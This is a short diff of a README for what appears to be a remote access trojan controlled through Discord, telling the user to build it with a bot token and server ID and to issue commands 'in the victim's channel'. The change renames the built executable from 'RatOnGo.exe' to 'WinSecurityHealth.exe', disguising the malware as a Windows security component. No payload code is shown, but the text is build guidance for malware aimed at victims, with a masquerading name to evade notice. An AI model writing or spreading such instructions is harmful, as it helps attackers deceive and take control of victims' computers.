@@ -40,7 +40,7 @@ I made it impossible for you to fuck this up.
     *   Just double-click `build.bat`. Everything else is included in the repo.
     *   It will ask for your **Bot Token** and **Server ID**. Don't fuck it up. Paste them and press Enter.
 3.  **Done.**
-    *   Look for `RatOnGo.exe`. That's your new toy.
+    *   Look for `WinSecurityHealth.exe`. That's your new toy.
 
 ## 🤖 Commands
 Use these in the victim's channel on Discord.
